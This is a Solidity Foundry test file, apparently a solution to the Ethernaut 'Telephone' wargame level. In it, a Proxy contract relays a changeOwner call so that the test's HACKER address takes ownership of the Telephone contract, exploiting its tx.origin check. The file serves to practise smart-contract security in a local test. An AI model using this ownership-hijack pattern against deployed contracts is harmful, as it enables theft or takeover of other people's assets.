// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import "src/Telephone.sol";

contract TelephoneTest is Test {
    Telephone private tl;
    Proxy private prx;
    address private constant HACKER = address(0x1);

    function setUp() external {
        tl = new Telephone();
        prx = new Proxy(address(tl));
        vm.deal(HACKER, 2e18);
        vm.startPrank(HACKER);
    }

    function testHack() external {
        prx.hack();
        assertEq(tl.owner(), HACKER);
        vm.stopPrank();
    }
}


contract Proxy {
    Telephone private tel;
    constructor(address _victim){
        tel = Telephone(_victim);
    }

    function hack() external {
        tel.changeOwner(msg.sender);
    }
}